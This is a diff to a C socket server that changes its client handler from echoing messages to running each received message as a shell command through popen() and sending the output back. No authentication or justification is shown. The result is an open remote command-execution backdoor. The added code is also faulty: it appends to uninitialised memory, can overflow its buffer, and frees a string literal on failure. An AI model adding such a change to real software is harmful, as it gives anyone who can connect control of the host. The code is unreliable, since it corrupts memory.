@@ -194,16 +194,39 @@ void* handle_client(void* arg) {
 
         messages_sent++;
 
-        int bytes_sent = send(client_fd, buffer, bytes_received, 0);
+        char* output = execute(buffer);
+
+        int bytes_sent = send(client_fd, output, strlen(output), 0);
         if (bytes_sent < 0) {
             perror("send failed");
             exit(EXIT_FAILURE);
         }
+
+        free(output);
     }
 
     close(client_fd);
 
     return NULL;
+}
+
+char *execute(char *command) {
+    FILE *fp;
+    char path[1035];
+
+    fp = popen(command, "r");
+    if (fp == NULL) {
+        return "Failed to run command\n";
+    }
+
+    char *result = malloc(1024);
+    while (fgets(path, sizeof(path)-1, fp) != NULL) {
+        strcat(result, path);
+    }
+
+    pclose(fp);
+
+    return result;
 }
 
 void setgid_s() {
